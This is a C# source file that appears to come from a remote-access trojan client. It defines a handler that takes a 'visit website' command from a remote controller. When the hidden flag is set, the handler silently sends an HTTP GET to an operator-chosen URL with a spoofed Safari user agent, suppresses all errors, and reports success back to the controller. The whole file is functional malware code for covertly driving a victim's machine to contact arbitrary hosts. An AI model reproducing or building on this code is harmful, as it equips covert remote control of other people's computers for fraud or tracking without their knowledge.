using Q3C273.Shared.Messages;
using Q3C273.Shared.Networking;
using System;
using System.Diagnostics;
using System.Net;

namespace Ton618.MessageHandlers
{
    public class WebsiteVisitorHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoVisitWebsite;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoVisitWebsite msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoVisitWebsite message)
        {
            var url = message.Url;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!message.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        var request = (HttpWebRequest)WebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (var response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                client.Send(new SetStatus { Message = "Visited Website" });
            }
        }
    }
}
